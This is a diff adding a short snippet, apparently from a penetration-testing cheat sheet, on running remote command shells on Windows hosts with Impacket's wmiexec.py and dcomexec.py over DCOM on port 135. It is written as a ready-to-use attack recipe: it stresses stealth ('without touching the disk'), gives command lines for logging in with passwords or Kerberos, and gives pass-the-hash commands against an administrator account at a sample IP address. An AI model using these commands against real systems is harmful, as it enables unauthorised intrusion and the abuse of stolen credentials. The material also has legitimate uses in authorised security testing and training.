@@ -1,0 +1,17 @@
+Stealthily execute a command shell without touching the disk or 
+running a new service using DCOM via port 135.
+In kali it is located on /usr/share/doc/python3-impacket/examples/
+
+bash
+#If no password is provided, it will be prompted
+./wmiexec.py [[domain/]username[:password]@]<targetName or address> #Prompt for password
+./wmiexec.py -hashes LM:NT administrator@10.10.10.103 #Pass-the-Hash
+#You can append to the end of the command a CMD command to be executed, if you dont do that a semi-interactive shell will be prompted
+Using parameter-k you can authenticate against kerberos instead of NTLM
+
+bash
+#If no password is provided, it will be prompted
+./dcomexec.py [[domain/]username[:password]@]<targetName or address>
+./dcomexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash
+#You can append to the end of the command a CMD command to be executed, 
+#if you dont do that a semi-interactive shell will be prompted
